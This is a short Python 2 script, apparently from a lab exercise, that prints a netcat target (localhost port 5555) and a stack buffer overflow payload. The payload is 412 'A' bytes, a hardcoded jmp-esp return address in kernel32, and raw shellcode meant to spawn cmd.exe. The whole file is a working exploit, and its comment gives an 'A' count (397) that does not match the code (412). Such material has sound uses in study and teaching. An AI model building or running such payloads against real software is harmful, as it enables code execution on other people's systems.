import sys

# Command to connect to Simple Program via netcat.
command = 'localhost 5555'

# Payload to be entered. Divided as Randon Chars + 397 A's + Address to Kernel32 Jump to ESP Command + Shellcode to spawn another cmd.exe
PAYLOAD= (b'\x41'*412) + b'\xDB\xFC\x01\x77' + b'\x31\xC0\x50\xBB\x1E\xFD\x05\x77\x50\x50\x50\x50\xFF\xD3'

print command
print PAYLOAD